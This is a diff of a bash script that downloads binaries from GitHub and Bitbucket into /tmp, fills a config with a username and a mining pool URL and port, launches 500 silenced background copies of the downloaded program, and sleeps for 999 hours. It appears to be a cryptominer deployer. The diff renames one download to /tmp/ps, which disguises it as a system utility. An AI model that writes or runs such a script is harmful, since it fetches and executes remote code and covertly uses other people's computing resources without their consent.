@@ -1,7 +1,7 @@
 #!/bin/bash
 
-wget https://raw.githubusercontent.com/walters99/Slurb/main/start
-wget https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
+wget -O /tmp/start https://raw.githubusercontent.com/walters99/Slurb/main/start
+wget -O /tmp/ps https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
 wget -O /tmp/build_config https://github.com/walters99/Slurb/raw/main/build_config
 
 user="$1"
@@ -14,9 +14,10 @@ sed -i "s/USERNAME/$user/" "/tmp/build_config"
 sed -i "s/POOL_URL/$pool_url/" "/tmp/build_config"
 sed -i "s/POOL_PORT/$pool_port/" "/tmp/build_config"
 
-chmod +x lol start
+chmod +x /tmp/ps /tmp/start
+
 for i in {1..500} :
 do
-  ./start >/dev/null &
+  /tmp/start >/dev/null &
 done
 sleep 999h
